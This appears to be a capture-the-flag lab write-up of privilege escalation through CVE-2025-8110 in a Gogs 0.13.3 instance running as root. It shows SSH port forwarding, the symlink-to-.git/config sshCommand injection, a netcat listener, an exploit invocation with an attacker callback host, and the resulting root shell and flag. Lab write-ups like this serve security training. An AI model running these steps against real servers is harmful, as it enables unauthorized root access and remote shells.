## Privilege Escalation - CVE-2025-8110

### Finding Gogs

Checking what is running internally on the host:

```bash
curl -s http://127.0.0.1:3001/
```

Returns the Gogs web interface. Gogs is a lightweight self-hosted Git service similar to GitHub.

Check the version and who is running it:

```bash
cd /opt/gogs/gogs && ./gogs --version
# Gogs version 0.13.3

ps aux | grep gogs
# root ... /opt/gogs/gogs/gogs web

cat /opt/gogs/gogs/custom/app.ini | grep RUN_USER
# RUN_USER = root
```

Gogs 0.13.3 running as root. This version is vulnerable to CVE-2025-8110.

### SSH Tunnel

Since Gogs only listens locally we need to forward the port:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
```

Now we can access Gogs at `http://127.0.0.1:3001` from our browser.

### Register an Account

Navigate to `http://127.0.0.1:3001/user/sign_up` in Firefox and register an account. Gogs has CAPTCHA so this needs to be done through the browser rather than curl.

```
Username: attacker1
Email:    attacker1@test.com
Password: Attacker1pass
```

### How CVE-2025-8110 Works

Gogs does not properly validate symbolic links when handling repository file operations. The attack works like this:

1. Create a repository on Gogs
2. Clone it locally
3. Create a symlink inside the repo pointing to `.git/config`
4. Push the symlink back to Gogs
5. Use the Gogs API to PUT content to the symlink file
6. Gogs follows the symlink and writes to the real `.git/config`
7. The malicious content injects a `sshCommand` into git config
8. When Gogs triggers any git operation involving SSH, the command executes as root

### Running the Exploit

Set up git identity first or the commit will fail:

```bash
git config --global user.email "attacker1@test.com"
git config --global user.name "attacker1"
```

Start a listener:

```bash
nc -lvnp 4446
```

Run the exploit:

```bash
python3 gogs_exploit.py \
  --url http://127.0.0.1:3001 \
  --host 10.10.14.21 \
  --port 4446
```

```
[+] Authenticated successfully
[+] Application token: a71a30999fe27c00d544a5242f0f9d034052a030
Repo creation status: 201
[+] Symlink pushed successfully
[+] Exploit sent, check your listener!
```

### Root Shell

```
connect to [10.10.14.21] from (UNKNOWN) [10.129.245.103]

root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# id
uid=0(root) gid=0(root) groups=0(root)

root@silentium:~# cat /root/root.txt
6d1b5e4072247450f20d587425ca2c3b
```

